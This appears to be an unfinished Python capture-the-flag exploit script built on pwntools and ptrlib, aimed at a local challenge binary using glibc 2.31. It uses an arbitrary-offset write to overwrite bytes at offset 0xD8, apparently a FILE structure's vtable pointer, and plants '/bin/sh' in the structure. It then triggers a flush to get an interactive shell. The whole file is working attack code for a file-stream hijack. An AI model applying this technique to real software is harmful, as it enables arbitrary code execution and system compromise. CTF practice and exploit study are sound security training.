#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./chall_patched")
pwn.context.binary = pwn.ELF(exe.filepath)
libc = ptr.ELF("./libc-2.31.so")
ld = ptr.ELF("./ld-2.31.so")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("localhost", 5000)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    def write(offset: int, value: int):
        io.sendlineafter(b"> ", b"2")
        io.sendlineafter(b"offset: ", str(offset).encode())
        io.sendlineafter(b"value: ", str(value).encode())
        return

    # for i in range(0x68):
    #     write(i, 0x41)

    write(0xD8, 0x30)
    write(0xD8 + 1, 0x72)
    write(0xD8 + 2, 0xE2)

    for i in range(len(b"/bin/sh\0")):
        write(i, b"/bin/sh\0"[i])

    input(">> ")
    io.sendlineafter(b"> ", b"1")
    # &_IO_file_sync = _IO_file_jumps + 96
    # RIP = vtable + 96
    # 0xe27230

    # fake_io =

    io.interactive()
    return


if __name__ == "__main__":
    main()
